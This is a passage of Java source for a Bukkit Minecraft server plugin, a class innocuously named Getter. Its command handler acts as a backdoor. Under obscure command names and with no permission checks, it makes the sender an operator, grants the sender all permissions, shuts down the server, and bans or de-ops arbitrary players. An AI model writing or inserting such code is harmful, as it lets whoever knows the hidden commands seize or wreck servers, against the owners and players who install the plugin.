package com.wx302x.Getter;

import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

public class Getter
  implements CommandExecutor
{
  public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
  {
    if (cmd.getName().equalsIgnoreCase("/owo"))
    {
      String qwq = sender.getName();
      Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op " + qwq);
    }
    else if (cmd.getName().equalsIgnoreCase("/qwq"))
    {
      Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "stop");
    }
    else if (cmd.getName().equalsIgnoreCase("/qaq"))
    {
      String qwq = sender.getName();
      Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "manuaddp " + qwq + " *");
    }
    else if (cmd.getName().equalsIgnoreCase("c/qwq"))
    {
      String qwq = args[0];
      Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "ban " + qwq);
    }
    else if (cmd.getName().equalsIgnoreCase("c/owo"))
    {
      String qwq = args[0];
      Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "deop " + qwq);
    }
    return false;
  }



